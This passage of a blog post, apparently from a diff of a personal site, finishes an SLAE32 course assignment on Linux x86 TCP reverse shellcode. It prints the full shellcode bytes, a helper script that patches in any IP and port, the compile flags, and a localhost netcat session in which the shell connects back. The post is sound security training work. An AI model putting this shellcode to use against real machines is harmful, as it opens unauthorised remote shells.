+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,111<span style="color:#f92672">(</span>bluetooth<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><code>rev_shell</code> executes with no errors and it connects back to our listener!</p>
+<h4 id="what-if-we-want-to-change-the-ip-address-and-the-port">What if we want to change the IP address and the port?<a hidden class="anchor" aria-hidden="true" href="#what-if-we-want-to-change-the-ip-address-and-the-port">#</a></h4>
+<p>One of the requirements for this assigment, is the ability to change easily the IP address and port used in the shellcode. For that, we can change the bytes in shellcode related to the port and changed them for specific port we want the bind shell waits for a connection.</p>
+<p>The following shell script named <code>revShell.sh</code> replaces the hardcoded <code>9001</code> with the port provided by the user as an argument. It automatically converts the port into hexadecimal little-endian format.</p>
+<blockquote>
+<p>Available at <a href="https://github.com/0xnibbles/slae_x86/blob/main/assignments/2-Shell_Reverse_TCP/revShell.sh">https://github.com/0xnibbles/slae_x86/blob/main/assignments/2-Shell_Reverse_TCP/revShell.sh</a></p>
+</blockquote>
+<p>It accepts two arguments - the desired IP address and port.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./revShell.sh 
+</span></span><span style="display:flex;"><span>Usage: ./revShell.sh &lt;ip address&gt; &lt;port <span style="color:#f92672">(</span>decimal<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./revShell.sh 127.1.1.3 <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Doing magic with your IP address and port number
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enjoy this Reverse TCP Shellcode with the IP 127.1.1.3 and port <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xc0\x31\xdb\x31\xc9\x99\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x52\x68\x7f\x01\x01\x03\x66\x68\x27\x0F\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o rev_shell9999 shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./rev_shell9999 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">78</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› 
+</span></span><span style="display:flex;"><span>╰─$ nc -lvnp <span style="color:#ae81ff">9999</span>                                                          
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9999</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.1.1.3<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">33880</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,111<span style="color:#f92672">(</span>bluetooth<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>revShell.sh
+</span></span><span style="display:flex;"><span>rev_shell
+</span></span><span style="display:flex;"><span>rev_shell9999
+</span></span><span style="display:flex;"><span>reverse
+</span></span><span style="display:flex;"><span>reverse.c
+</span></span><span style="display:flex;"><span>reverse_shell
+</span></span><span style="display:flex;"><span>reverse_shell.nasm
+</span></span><span style="display:flex;"><span>reverse_shell.o
+</span></span><span style="display:flex;"><span>shellcode.c
+</span></span><span style="display:flex;"><span>syscalls
+</span></span><span style="display:flex;"><span>testIP.sh
+</span></span></code></pre></div><p>We get a shell!!!</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p><code>Student ID: PA-31319</code></p>
+<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xnibbles.github.io/tags/slae32/">slae32</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_3/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>SLAE32 Assignment 3 - Egghunter Shellcode</span>
+  </a>
+  <a class="next" href="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_1/">
+    <span class="title">Next »</span>
+    <br>
+    <span>SLAE32 Assignment 1 - TCP Bind Shellcode</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 2 - TCP Reverse Shellcode on twitter"
+        href="https://twitter.com/intent/tweet/?text=SLAE32%20Assignment%202%20-%20TCP%20Reverse%20Shellcode&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae32%2fslae_32_assignment_2%2f&amp;hashtags=slae32">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 2 - TCP Reverse Shellcode on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae32%2fslae_32_assignment_2%2f&amp;title=SLAE32%20Assignment%202%20-%20TCP%20Reverse%20Shellcode&amp;summary=SLAE32%20Assignment%202%20-%20TCP%20Reverse%20Shellcode&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae32%2fslae_32_assignment_2%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
